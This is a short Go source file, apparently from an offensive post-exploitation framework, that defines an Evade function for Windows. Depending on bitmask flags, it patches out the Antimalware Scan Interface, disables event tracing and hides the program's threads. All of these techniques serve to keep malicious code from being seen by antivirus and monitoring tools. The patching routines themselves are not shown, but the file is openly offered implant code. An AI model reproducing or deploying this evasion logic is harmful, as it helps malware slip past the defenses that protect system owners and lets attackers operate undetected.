//go:build windows

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package device

import "github.com/iDigitalFlame/xmt/device/winapi"

// Evade will attempt to apply evasion techniques specified by the bitmask flag
// value supplied.
//
// The flag values are in the form of 'Evade*' and are platform specific.
//
// Any errors that occur during execution will stop the other evasion tasks
// scheduled in this function flags.
func Evade(f uint8) error {
	if f&EvadeWinPatchAmsi != 0 {
		if err := winapi.PatchAmsi(); err != nil {
			return err
		}
	}
	if f&EvadeWinPatchTrace != 0 {
		if err := winapi.PatchTracing(); err != nil {
			return err
		}
	}
	if f&EvadeWinHideThreads != 0 {
		if err := winapi.HideGoThreads(); err != nil {
			return err
		}
	}
	return nil
}
